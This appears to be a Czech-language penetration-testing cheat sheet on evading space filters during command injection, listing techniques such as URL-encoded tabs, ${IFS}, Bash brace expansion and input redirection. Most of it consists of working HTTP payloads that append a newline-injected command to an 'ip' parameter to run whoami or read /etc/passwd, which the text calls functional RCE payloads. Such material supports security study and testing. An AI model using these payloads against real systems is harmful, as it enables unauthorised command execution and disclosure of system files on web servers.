Obcházení filtrů mezer (**Space Filters**) je klíčovou technikou při exploataci Command Injection v případech, kdy backendová aplikace filtrací blokuje běžné mezery (např. u vstupů jako IP adresy, kde se mezera neočekává).

### 📌 Přehled technik obcházení mezer (Space Bypasses)

| **Technika**            | **Payload / Vzor**     | **Princip & Kompatibilita**                                                                                                      |
| ----------------------- | ---------------------- | -------------------------------------------------------------------------------------------------------------------------------- |
| **URL-Encoded Tab**     | `%09`                  | Linux i Windows interpretují tabulátor mezi příkazem a argumenty stejně jako mezeru.                                             |
| **Proměnná `$IFS`**     | `${IFS}` nebo `$IFS$9` | In-built proměnná shellu (_Internal Field Separator_), jejíž výchozí hodnotou je mezera, tabulátor a nová řádka. _(Pouze Linux)_ |
| **Brace Expansion**     | `{cat,/etc/passwd}`    | Bash automaticky nahradí čárky v složených závorkách mezerami. _(Pouze Linux Bash)_                                              |
| **Přesměrování vstupu** | `cat</etc/passwd`      | Znak `<` předá obsah souboru na standardní vstup (`STDIN`) příkazu bez použití mezery. _(Linux & Windows)_                       |

### 🛠️ Praktické ukázky použití payloadů

Kombinací operátoru nové řádky (`%0a`) pro obcházení zakázaných znaků `;` / `&&` a technik pro obcházení mezer získáme funkční RCE payloady:

#### 1. Použití tabulátoru (`%09`)

HTTP

```
POST /index.php HTTP/1.1
Host: target.local

ip=127.0.0.1%0awhoami%09-a
```

#### 2. Použití proměnné `${IFS}`

Prase `/etc/passwd` bez použití mezer:

HTTP

````
ip=127.0.0.1%0acat${IFS}/etc/passwd
```> 💡 **Poznámka:** Pokud za `$IFS` následuje další písmeno (např. `$IFSa`), shell by hledal proměnnou `$IFSa`. Proto se používá buď zápis ve složených závorkách `${IFS}`, nebo trik se speciální proměnnou `$IFS$9` (`cat$IFS$9/etc/passwd`).

#### 3. Použití Bash Brace Expansion (`{}`)
Funkční pouze v prostředí Bash (nikoliv v minimalistickém `/bin/sh`):
```http
ip=127.0.0.1%0a{cat,/etc/passwd}
````

#### 4. Použití přesměrování vstupu (`<`)

Vhodné pro čtení souborů:

HTTP

```
ip=127.0.0.1%0acat</etc/passwd
```